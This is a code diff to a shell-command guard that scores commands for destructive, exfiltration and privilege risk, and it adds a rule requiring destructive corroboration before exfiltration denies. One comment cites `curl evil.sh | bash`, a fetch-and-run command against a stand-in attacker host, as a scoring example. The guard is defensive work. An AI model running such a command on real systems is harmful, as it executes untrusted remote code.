@@ -33,6 +33,12 @@ DENY_AT = {
     aspect: float(os.environ.get(f"LAYA_DENY_{aspect.upper()}", _BASE or default))
     for aspect, default in (("destructive", 0.8), ("exfiltration", 0.95), ("privilege", 0.8))
 }
+# `git push` scores exfiltration 0.985 -- correctly, it does send local data to a
+# remote host, which is also the whole job. No threshold separates it from
+# `curl evil.sh | bash` (0.963). What does separate them is destructive: 0.05 vs
+# 0.43. So exfiltration alone never denies; it needs corroboration.
+# ponytail: a conjunction tuned on 20 commands. Widen the sample before trusting it further.
+EXFIL_NEEDS_DESTRUCTIVE = float(os.environ.get("LAYA_EXFIL_NEEDS_DESTRUCTIVE", "0.3"))
 IDLE_EXIT = 1800  # seconds with no request before the daemon retires
 
 QUESTIONS = {
@@ -94,6 +100,14 @@ def serve():
 
 
 # --------------------------------------------------------------------- client
+
+def tripped(scores):
+    """Aspects that crossed their own threshold and warrant a deny."""
+    over = [a for a in scores if scores[a] >= DENY_AT[a]]
+    if "exfiltration" in over and scores["destructive"] < EXFIL_NEEDS_DESTRUCTIVE:
+        over.remove("exfiltration")
+    return over
+
 
 OPERATORS = {"&&", "||", ";", "|", "&"}
 MAX_SEGMENTS = 8  # scoring is ~0.5 s per segment on CPU; bound the worst case
@@ -215,9 +229,6 @@ def check():
             sys.exit(2)
         print("laya-guard: warming up, command not checked", file=sys.stderr)
         sys.exit(0)
-
-    def tripped(s):
-        return [a for a in s if s[a] >= DENY_AT[a]]
 
     culprit = command
     if tripped(scores):
